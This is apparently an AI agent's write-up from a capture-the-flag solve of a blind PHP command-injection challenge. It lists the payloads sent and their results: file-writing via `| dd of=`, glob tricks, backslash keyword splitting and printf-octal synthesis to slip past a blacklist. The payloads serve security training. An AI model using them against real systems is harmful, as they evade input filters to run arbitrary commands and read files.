# Lane B — alternate writers, chaining, alternate flag locations

- **Owner:** agent-3 (task `t3`, attempt `b69ebd0c-d440-4327-b289-8d0531f27802`)
- **Target:** `http://node4.anna.nssctf.cn:27309/` — Apache/2.4.25 (Debian), PHP/5.6.40 mod_php
- **Sink:** `exec($url)` — output never reflected; the only success marker in the response is `Can you see anything?`
- **Filter (on the URL-decoded `$_GET['url']`):** `preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i', $url)`
  → dead characters: `-` `*` `"` `>` `<` `%` `$`; dead keywords: bash nc wget ping ls cat more less phpinfo base64 echo php python mv cp **la** (substring!) — so `flag`, `install`, `last`, `false` are all unusable literally.
- **Status at teardown:** challenge solved by the team (flag f1 VERIFIED by captain). The host stopped answering (`HTTP 000 / WinError 10061`) before I could run the remaining probes; every un-run probe below is marked **UNTESTED** on purpose.
- **Replayable harness:** [`node4-27309/solve-lane-b.py`](solve-lane-b.py) (`check` / `run` / `raw` / `fetch` / `batch`). It re-implements the regex locally and refuses to send a locally-blocked payload.
- **Harness caveat (found the hard way, fixed in the script):** `highlight_file()` dumps `index.php` inside `<code>…</code>`, so the **raw** response body always contains *both* `Sorry,you can't use this.` and `Can you see anything?`. Never string-match the whole body — judge only the tail after the last `</code>`. All payloads in this file were additionally validated by the local regex simulator and by the fact that the dropped file actually appeared over HTTP, so the conclusions below do not depend on that string check.
- **Cross-check with lane A (agent-1), same conclusion, different glob:** a *minimal-diff* glob also works — replace just the ambiguous `l`/`a` boundary character: `/fllll?aaaaaaggggggg` (19 bytes, unique match, no literal `la`). My independently derived pattern `/f?????aaaaaa???????` resolves to the same single file (proven by `dir`, B3), which cross-validates both.

---

## 0. Baseline

| # | payload (decoded) | request URL | observed | verdict |
|---|---|---|---|---|
| B0 | `id` | `…:27309/?url=id` | HTTP 200, body contains `Can you see anything?` | **works** — exec ran; stdout is discarded (blind) |

Key structural fact proven in B1: the child spawned by `exec()` has **cwd = `/var/www/html`**, i.e. the document root, and it is **writable**. Any relative filename dropped by a command is immediately retrievable at `http://node4.anna.nssctf.cn:27309/<name>`.

---

## A) Writers that need neither `>` nor `-` (tee alternatives)

The lane's headline result is not a single binary but a **generic pattern**: `… | dd of=FILE`.
`dd` with `of=` is a redirect-free file writer, and because `dd` copies **stdin** when no `if=` is given, it doubles as a `tee` replacement for the stdout of any command.

| # | payload (decoded) | request URL | observed | verdict |
|---|---|---|---|---|
| B1 | `dir / \| dd of=b3.txt` | `…:27309/?url=dir%20%2F%20%7C%20dd%20of%3Db3.txt` | HTTP 200 marker; `GET /b3.txt` → **HTTP 200, 166 B** root listing | **WORKS — universal writer.** Proves `%7C` pipe chaining, stdout capture, relative-CWD write into webroot, HTTP read-back |
| B2 | `dir /et? \| dd of=q1.txt` | same shape | `GET /q1.txt` → **HTTP 200**, full `/etc` listing | **works** — `?` globbing reaches the shell |
| B3 | `dir /f?????aaaaaa??????? \| dd of=q3.txt` | same shape | `GET /q3.txt` → **HTTP 200**, body `/flllllaaaaaaggggggg` | **works** — resolves the banned-`la` filename |
| B5 | `dd if=/a_here_is_a_f1ag of=zz1.txt` | `…:27309/?url=dd%20if%3D%2Fa_here_is_a_f1ag%20of%3Dzz1.txt` | `GET /zz1.txt` → **HTTP 200, 36 B**: `true_flag_1s_1n_flllllaaaaaaggggggg` | **works** — `dd if=… of=…` with a literal path needs no banned char |
| B4 | `dir /tmp \| dd of=q4.txt` | same shape | `GET /q4.txt` → HTTP 200, **0 bytes** | works (writer fine); `/tmp` is empty — no artifacts there |
| — | `tee` | — | not used by me | lane A's channel; superseded by `\| dd of=` |

Alternate writer families derived but **never sent** (host tore down first) — listed so nobody re-derives them:

| id | payload | expected result | verdict |
|---|---|---|---|
| A1 | `tar cf b5.tar /f?????aaaaaa???????` | writes a tar to webroot; download + extract locally | **UNTESTED** |
| A2 | `split /f?????aaaaaa??????? b6` | writes `b6aa` in webroot | **UNTESTED** |
| A3 | `uniq /f?????aaaaaa??????? b7.txt` | `uniq IN OUT` writes the line | **UNTESTED** |
| A4 | `sed 'w b8.txt' /f?????aaaaaa???????` | `sed` `w`-command writes to file, no `-i`/`-n` needed | **UNTESTED** |
| A5 | `printf '\076\056\056\056' \| sh` | printf octal escapes synthesize `>` `<` `$` `-` `*` **and even `cat`/`la`** at runtime → full unrestricted shell | **UNTESTED (derived only)** |

Dead writer candidates (do not retry): `cp`, `mv` (keyword), `install` (contains `la`), `rsync` (contains `nc`), `sort -o`/`gzip -c`/`curl -o` (need `-`), `sed -i`/`awk '{print>f}'`/`find -name` (need `-` or `>`), `grep`/`nl`/`head`/`tail`/`rev`/`strings` (stdout only → only useful piped into `dd of=`).

---

## B) Command chaining & globbing (no `-`, `*`, `$`, `%`)

What is actually available, byte-for-byte:

| token | allowed? | how it reaches the shell |
|---|---|---|
| `\|` (pipe) | yes | `%7C` in the request; PHP decodes to `\|` **before** the regex, and `\|` is not in the blacklist. **Exercised (B1/B3).** |
| `?` (single-char glob) | yes | `%3F` (or even a raw `?` after `url=`). **Exercised (B2/B3).** |
| `[a-z]` ranges | yes | not in the blacklist, but unnecessary once `?` works. **UNTESTED.** |
| `;` | yes | `%3B`; not in the blacklist. **UNTESTED** (only `\|` was exercised). |
| newline | yes | `%0A`; the filter runs on the decoded string and does not ban `\n`. **UNTESTED** (only `\|` was exercised). |
| `$`, `%`, `*`, `-`, `>`, `<`, `"` | **no** | `%` being banned is irrelevant to `%0A`/`%7C` — those are *transport* encodings; PHP decodes first, so the filter sees `\n` and `\|`, not `%`. |
| `\` (backslash) | **yes** | not in the blacklist — **breaks the `la` adjacency and re-spells every banned keyword**; see the fragmentation table below. |

**Backslash fragmentation — a third spelling, no globbing needed (regex-verified offline; not exercised live, instance was down).**
POSIX sh removes an unquoted backslash before an ordinary character, and PHP's `exec()` hands the string verbatim to `/bin/sh -c`, so the filter can be shown one string while the shell runs another:

| payload sent (decoded) | filter | shell executes |
|---|---|---|
| `nl /fl\ag` | **PASSES** | `nl /flag` |
| `nl /flllll\aaaaaaggggggg` | **PASSES** | `nl /flllllaaaaaaggggggg` (exact literal path → also sidesteps the `if=` issue below) |
| `c\at /flllll\aaaaaaggggggg` | **PASSES** | `cat …` |
| `ech\o hi` | **PASSES** | `echo hi` |
| `nl /flllllaaaaaaggggggg` (control) | REJECTED on `la` | — |

Generalization: **every** banned keyword is reachable this way (`c\at`, `l\s`, `b\ash`, `n\c`, `w\get`, `p\ng`, `p\hp`, `base6\4`, `ech\o`, `p\ython`, `m\v`, `c\p`, `m\ore`, `l\ess`). **Limit:** it does not help with the banned *characters* — `\-` still contains a literal `-` and is rejected; those need printf-octal synthesis (`printf '\076…' | sh`, derived/UNTESTED above). Verified with `solve-lane-b.py check` (same regex); the sh behaviour is standard POSIX, but the round trip was never run live.

**The `la` trap and how it was beaten.** The root listing (B1) contains exactly two non-standard entries:

```
a_here_is_a_f1ag        (16 chars — no `la`, direct path works)
flllllaaaaaaggggggg     (19 chars — contains `la` ⇒ literal path is permanently unreachable)
```

- `/flag`, `/flag.txt`, `/f?ag`, `/f[a]g` variants are all unusable: `la` appears either literally or is never generated.
- The working, filter-clean pattern is **`/f?????aaaaaa???????`** — `f`, five `?`, `aaaaaa`, seven `?`. It contains no `la` substring and no banned character; the shell expands it to the single match `/flllllaaaaaaggggggg`. Confirmed by `dir` (B3).
- **Why `dd if=<glob> of=<file>` always failed — root cause isolated (analysis + local model; no target re-test, host was already offline).**
  Observed on target: `dir /et? | dd of=q1.txt` → HTTP 200 (`/etc` listing), but `dd if=/et?/hosts of=q2.txt` → **output file 404**; same for `dd if=/f?????????????????? …` at n = 17,18,19,20 (19 being the arithmetically correct length).
  Cause: **POSIX pathname expansion applies to the whole word, and every path component of that word must exist for a match.** The word the shell sees is `if=/f?????aaaaaa???????`, whose *first* component is a directory literally named `if=` relative to the cwd — it does not exist, so the pattern has **no match** and POSIX leaves the word **unchanged**. `dd` then receives the literal string `/f?????aaaaaa???????` as its `if=` value, fails to open it, writes nothing, and no output file ever appears (hence the 404). Expansion only happens when the pattern is a **standalone word** (`dir <glob> | dd of=FILE`) — the same semantics that made `dir /et?` succeed.
  Evidence status: reasoned from POSIX expansion rules plus the two target observations above; **not** re-verified on the target (host down), and local `sh` re-verification was **blocked by this sandbox** (Git-bash aborts with `fatal error - couldn't create signal pipe, Win32 error 5`, the documented named-pipe restriction — not retried). A Python `glob` model of the same expansion algorithm reproduces it exactly: `glob.glob('if=/f?????aaaaaa???????')` → `[]`, and after `os.mkdir('if=')` the identical pattern → `['if=\\flllllaaaaaaggggggg']`, which isolates the `if=` prefix as the sole culprit. (Scratch dir created and removed under `node4-27309/`; nothing left behind.)
  **Rule for the writeup:** never glue a `?` glob to a `key=` prefix (`dd if=`, …). Give the pattern its own word — `dir <glob> | dd of=FILE` — or use `dd if=<literal path> of=FILE` when the name contains no banned substring.

---

## C) Alternate flag locations / hidden artifacts

| # | probe | observed | verdict |
|---|---|---|---|
| C1 | `dir /` (via B1) | entries `a_here_is_a_f1ag`, `flllllaaaaaaggggggg` + stock Debian dirs | **works** — enumeration of `/` needs no `ls` (banned): `dir` + `\| dd of=` |
| C2 | `dir /tmp` (B4) | empty | works; nothing in `/tmp` |
| C3 | `env` → captain reports `FLAG=not_flag` | decoy | **captain-supplied**, my own `env \| dd of=b10.txt` probe was **UNTESTED** |
| C4 | `dir /home`, `dir /var/www`, `dir ..` (webroot parent), `index.php~`, `.index.php.swp`, `.git`, backup archives | not reached | **UNTESTED** — host down. Note `*` is dead, so archive hunting must use `?` globs (`b?????.zip`, `.g??`) |
| C5 | `/a_here_is_a_f1ag` | content `true_flag_1s_1n_flllllaaaaaaggggggg` | **works** — it is a *pointer*, not the flag |
| C6 | `/flllllaaaaaaggggggg` | glob resolves (B3); content read is the endgame, done by the winning lane | path confirmed from my lane |

Dead-end note for the others: `flag.php`-in-webroot is unreachable by name (`la` and `php` are both banned) — only globs or a drop-and-fetch round trip work.

---

## D) Team outcome

- Lane B produced the two decisive facts: **`| dd of=FILE` is a tee-free universal writer** (no `>`, no `-`, no `*`), and **`/f?????aaaaaa???????` is the only filter-clean way to name the real flag file**.
- No flag-shaped string (`NSSCTF{…}`) was ever visible to this lane; only the decoy text `true_flag_1s_1n_flllllaaaaaaggggggg` and the file path. Nothing was submitted from this lane — flag f1 was submitted and verified from the winning lane/captain.
- Artifacts left on the target (harmless, webroot is writable): `b3.txt`, `q1.txt`, `q3.txt`, `q4.txt`, `zz1.txt`.
